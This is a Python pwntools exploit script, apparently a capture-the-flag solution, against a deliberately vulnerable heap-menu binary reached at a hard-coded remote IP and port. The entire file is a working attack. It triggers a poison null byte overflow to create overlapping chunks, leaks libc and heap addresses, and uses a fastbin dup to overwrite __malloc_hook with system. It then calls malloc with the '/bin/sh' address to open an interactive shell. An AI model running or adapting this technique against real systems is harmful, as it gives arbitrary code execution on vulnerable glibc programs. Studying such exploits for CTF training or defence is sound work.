#!/usr/bin/env python3


from pwn import *

index = 0

def malloc(size):
    global index
    r.sendafter(b'>>',b'1\n')
    r.sendafter(b'size:',f"{size}")
    index+=1
    return index - 1

def free(index):
    r.sendafter(b'>>',b'2\n')
    r.sendafter(b'index:',f"{index}\n")

def edit(index,data):
    r.sendafter(b'>>',b'3\n')
    r.sendafter(b'index:',f"{index}\n")
    r.sendafter(b'data:',data)

def read_leak(index):
    r.sendafter(b">>",b"4\n")
    r.sendafter(b'index:',f"{index}\n")
    r.recvuntil(p64(0x70))
    heap_leak = u64(r.recvuntil(p64(0x91))[0:6].decode('latin-1').ljust(8,'\x00'))
    libc_leak = u64(r.recvuntil(b"\x7f").decode('latin-1').ljust(8,'\x00'))
    return libc_leak,heap_leak

elf = ELF("./cute_little_vulnerable_storage")
libc = ELF("./libc.so.6")
r = remote("147.182.172.200",1027)
#r = process("./cute_little_vulnerable_storage")
r.timeout = 1.0
chunk_A = malloc(0x68)
chunk_B = malloc(0x208)
chunk_C = malloc(0x98)
chunk_D = malloc(0x28)
free(chunk_B)
edit(chunk_A,b"A" * 0x68)
chunk_B1 = malloc(0xf8)
chunk_B2 = malloc(0x68)
free(chunk_B1)
free(chunk_A)
free(chunk_C)
log.info("Backward consolidation triggered")
free(chunk_B2)
chunk_E = malloc(0x1a8)
log.info("Overlapping chunk to cover over smallbin and fastbin metadata and to perform a fastbin dup")
read_leak(chunk_E)
libc_leak,heap_base = read_leak(chunk_E)
libc_base = libc_leak - (libc.sym["main_arena"] + 216)
log.info("The base address of libc is  " + hex(libc_base))
log.info("The base address of heap is " + hex(heap_base))
fake_fast = libc_base + libc.sym["__malloc_hook"] - 35
log.info("Using the fake fast field from IO_wide_data present before the malloc hook to create the fake chunk")
payload = b'A' * 0xf8 + p64(0x70) + p64(fake_fast)
edit(chunk_E,payload)
log.info("Using the Use after free primitive due to the overlapping chunk to create a fastbin dup primitive")
chunk_F = malloc(0x68)
chunk_G = malloc(0x68)
system = libc_base + libc.sym["system"]
edit(chunk_G,b'A' * 19 + p64(system))
log.info("Malloc hook overwritten with system function address")
log.info("The location of system function in the libc is " + hex(system))
bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))
log.info("The location of /bin/sh string in libc is " +  hex(bin_sh))
chunk_H = malloc(bin_sh)
log.info("A single null byte overflow to create a google poison null byte primitive leading to a fastbin dup ended with a shell")
r.interactive()
